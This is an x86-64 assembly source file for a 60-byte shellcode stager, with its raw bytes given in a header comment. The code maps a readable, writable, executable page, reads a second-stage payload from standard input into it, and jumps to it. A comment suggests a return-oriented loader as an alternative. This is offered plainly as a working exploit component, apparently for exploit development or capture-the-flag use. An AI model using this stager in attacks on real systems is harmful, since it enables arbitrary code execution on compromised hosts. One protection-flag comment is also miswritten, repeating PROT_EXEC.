; \x48\x31\xff\xbe\x00\x10\x00\x00\xba\x07\x00\x00\x00\x41\xba\x22\x00\x00\x00\x4d\x31\xc0\x49\xff\xc8\x4d\x31\xc9\xb8\x09\x00\x00\x00\x0f\x05\x48\x31\xff\x48\x89\xf2\x48\x89\xc6\xb8\x00\x00\x00\x00\x0f\x05\xff\xd6\x90\x90\x90\x90\x90\x90\x90
; Length: 60
; If length is a problem, consider using a return oriented loader.

global _start
section .text

%define SIZE 60

_start:
	; void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
	; mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
	xor rdi, rdi	; addr
	mov rsi, 0x1000	; length
	mov rdx, 0x7	; PROT_READ | PROT_EXEC | PROT_EXEC
	mov r10, 0x22	; MAP_PRIVATE | MAP_ANON
	xor r8, r8
	dec r8		; -1
	xor r9, r9
	mov rax, 9	; mmap
	syscall

	; ssize_t read(int fd, void *buf, size_t count);
	; read(0, mmapped, 0x1000);
	xor rdi, rdi	; fd
	mov rdx, rsi	; count
	mov rsi, rax	; buf
	mov rax, 0	; read
	syscall

	call rsi
	times SIZE - ($ - $$) db 0x90
